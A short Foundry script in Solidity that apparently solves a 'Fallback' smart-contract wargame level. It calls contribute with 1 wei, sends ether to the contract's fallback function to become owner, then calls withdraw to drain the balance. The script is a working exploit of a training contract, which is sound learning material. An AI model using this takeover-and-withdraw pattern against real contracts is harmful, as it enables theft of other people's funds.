// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "src/01-Fallback.sol";


contract Exp is Script {


    Fallback public fallbackInstance = Fallback(payable(0xB9238846DD86B01E3c5fFc61ae1938567830D23a));
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));


    function run() external {
        vm.startBroadcast(hacker);

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();
        
        vm.stopBroadcast();
    }
}